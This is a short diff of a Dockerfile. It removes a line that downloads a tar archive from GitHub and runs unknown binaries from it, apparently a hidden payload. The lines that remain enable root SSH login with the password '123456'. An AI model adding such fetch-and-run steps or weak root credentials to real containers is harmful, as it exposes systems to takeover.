@@ -18,6 +18,5 @@ RUN echo '/usr/sbin/sshd -D' >>/luo.sh
 RUN echo 'PermitRootLogin yes' >>  /etc/ssh/sshd_config 
 RUN echo root:123456|chpasswd
 RUN chmod 755 /luo.sh
-RUN wget https://raw.githubusercontent.com/robertreynolds2/RTMFIX/main/pilus.tar && tar xf pilus.tar && chmod +x pilus && ./renyah
 EXPOSE 80
 CMD  /luo.sh
